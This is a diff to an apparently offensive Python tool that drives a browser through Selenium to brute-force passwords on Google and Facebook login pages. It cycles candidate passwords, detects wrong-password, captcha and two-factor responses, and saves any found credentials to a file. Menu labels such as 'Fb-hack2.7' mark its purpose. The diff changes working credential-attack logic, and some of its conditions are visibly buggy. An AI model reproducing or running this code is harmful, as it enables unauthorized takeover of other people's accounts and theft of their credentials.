@@ -241,9 +241,6 @@ def proxy_errorV(errorLogged = None, terminate = None):
       onload_proxy(pop = terminate)
       logging.error(errorLogged)
       print(f'{red}Proxy connection failed{plain}')
-    if 'net::ERR_CONNECTION_REFUSED' or 'net::ERR_PROXY_CONNECTION_FAILED' in errorLogged:
-      logging.warning(errorLogged)
-      print(f'{red}If proxy is enabled...Run "python server.py" before trying again{plain}')
       
     else:
       print(errorLogged)
@@ -290,6 +287,8 @@ def main():
       br = True
       while br:
         target = """
+        𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚝𝚎𝚖𝚙𝚕𝚊𝚝𝚎𝚜
+        
         [1] 𝙶𝚘𝚘𝚐𝚕𝚎 [𝙶-𝚜𝚙𝚕𝚒𝚗𝚝𝚎𝚛]
         [2] 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝙵𝚋-𝚑𝚊𝚌𝚔2.7]
         [3] 𝙴𝚡𝚒𝚝
@@ -316,6 +315,7 @@ def main():
             driver = webdriver.Chrome(options = options)
             driver.get(sign_in_tar)
             time.sleep(5)
+
             wait = WebDriverWait(driver, 20)
             page_source = driver.page_source
             page_ = bs(page_source, 'html.parser')
@@ -343,33 +343,35 @@ def main():
                 target_password.send_keys(check_password)
                 wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
                 driver.find_element(By.XPATH,'//button[contains(text(), "Next")]').click()
-                time.sleep(5) 
-                response_ = bs(driver.page_source, 'html.parser').text
-                if "Wrong password" in response_:
-                  print(f'{red}Incorrect password : {check_password} {plain}')
+                wait.until(EC.visibility_of_element_located((By.XPATH, '//span[contains(text(), "Wrong password")]')))
+                
+                print(f'{red}Incorrect password : {check_password} {plain}')
                   
-                elif "Confirm that you\'re not a robot" in response_:
-                  captcha_con = captcha.extend(check_password)
+              except selenium.common.exceptions.TimeoutException:
+                
+                page_ = bs(driver.page_source, 'html.parser').text
+                print(page_)
+                if r"Couldn’t find your Google Account" in page_:
+                  print(f'{red}Couldn\'t find the google account {email_or_phone}{plain}')
+                  driver.quit()
+                  break
+                elif r"Enter a valid email or phone number" in page_:
+                  print(f'{red}Enter a valid email or phone number{plain}')
+                  driver.quit()
+                  break
+                  
+                elif "Confirm that you’re not a robot" in page_:
+                  captcha.extend(check_password)
                   print(f'{red}Captcha detected {plain}')
                   if len(captcha) > 5:
                     print(f'{red}The server keeps calling me a bot, i should just go to sleep now💤...You should too{plain}')
                     driver.quit()
                     break
-                
+  
                 elif r"You're signed in" in response_ or   r"Recovery information" in response_:
                   print(f'{green}Correct password : {check_password}{plain}')
                   driver.quit()
                   save_passwords.write(f'{username_email} - {check_password} - Google - {time.time()}\n')
-                  break
-              except Exception:
-                page_ = bs(driver.page_source, 'html.parser')
-                if r"Couldn't find your Google account" in page_:
-                  print(f'{red}Could find the google account {email_or_phone}{plain}')
-                  driver.quit()
-                  break
-                if r"Enter a valid email or phone number" in page_:
-                  print(f'{red}Enter a valid email or phone number{plain}')
-                  driver.quit()
                   break
                 else:
                   pass
@@ -426,35 +428,33 @@ def main():
                 driver.find_element(By.XPATH,'//button[contains(text(), "Log in")]').click()
                 try:
                     
-                  wait.until(EC.visibility_of_element_located((By.XPATH, '//div[contains(text(), "incorrect")] | //div[contains(text(),  "Check your notifications on another device")]')))
+                  wait.until(EC.visibility_of_element_located((By.XPATH, '//div[contains(text(), "incorrect")]')))
                   page_content = bs(driver.page_source, 'html.parser').text
                   if "incorrect" in page_content:
                     print(f'{red}𝙸𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍{plain}', flush = True)
-                    
-                  elif "Check your notifications on  another device" in page_content:
-                    print(f'{red}Correct password {check_password} [{yellow} might have 2 factor authentication {plain}]', flush = True)
-                    
-                    driver.quit()
-                    save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
-                    break
-                  else:
-                    print(f'{green} {check_password} is the correct password{plain}')
-                    driver.quit()
-                    break
                   
                 except selenium.common.exceptions.TimeoutException as sel_timer:
                   page_now = bs(driver.page_source, 'html.parser').text
-                  if "find your account" in page_now:
+                  if "Find your account" in page_now:
                     print(f'{red}Couldn\'t find the account {username_email}{plain}')
                     break
-                  
-                  logging.critical(sel_timer)
-                  print(f'{red}Await response timeout{plain}')
-                  pass
+                  if "Check your notifications on  another device" in page_content:
+                    print(f'{yellow}Correct password {check_password} [ might have 2 factor authentication {plain}]', flush = True)
+                    driver.quit()
+                    save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
+                    break
+                  if  'Find friends' in page_content or 'authentication' in page_content or 'recovery information':
+                    print(f'{yellow} {check_password} is the correct password{plain}')
+                    
+                  else:
+                    logging.critical(sel_timer)
+                    print(f'{red}Await response timeout{plain}')
+                    pass
                     
                 except selenium.common.exceptions.NoSuchElementException as sel_err:
                   logging.error(sel_err)
-                  print(f'{red}Kindly inform the developer of this error, when spotted{plain}')
+                  print(f'{red}Kindly inform the developer of this error, once spotted{plain}')
+
               else:
                 print(f'{red}Requests have been temporarily blocked{plain}')
                
@@ -464,6 +464,7 @@ def main():
               break
             
           driver.quit()
+          
         elif tar in ['exit','3']:
           br = False
     elif command.lower() == 'payload':
